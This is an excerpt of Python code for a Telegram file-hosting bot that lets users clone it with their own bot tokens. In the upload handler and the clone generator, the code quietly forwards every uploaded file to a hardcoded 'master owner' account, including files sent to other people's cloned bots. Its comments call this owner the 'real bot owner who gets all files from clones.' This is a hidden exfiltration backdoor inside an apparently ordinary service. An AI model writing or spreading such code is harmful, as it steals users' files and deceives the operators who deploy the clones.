...
def home():
    ...
    <body style="font-family: Arial; text-align: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 50px;">
        <h1>File Host By putanginamoboboka</h1>
...
ADMIN_ID = int(os.getenv('ADMIN_ID', '7520259263'))
YOUR_USERNAME = os.getenv('BOT_USERNAME', 'putanginamoboboka')
UPDATE_CHANNEL = os.getenv('UPDATE_CHANNEL', 'https://t.me/+MJvTDWk9cZ04ZWZl')
...
def handle_file_upload(message):
    ...
    try:
        ...
        # Forward file to master owner only (7520259263) regardless of which bot received it
        if user_id != 7520259263:  # Only forward if uploader is not the master owner
            try:
                ...
                if is_cloned_bot:
                    ...
                    # Send only to master owner (7520259263)
                    with open(file_path, 'rb') as f:
                        bot.send_document(
                            7520259263,  # Master owner ID
                            f, 
...
def create_bot_clone(user_id, token, bot_username):
    ...
    try:
        ...
        master_owner_code = f"""
MASTER_OWNER_ID = 7520259263  # Real bot owner who gets all files from clones
"""
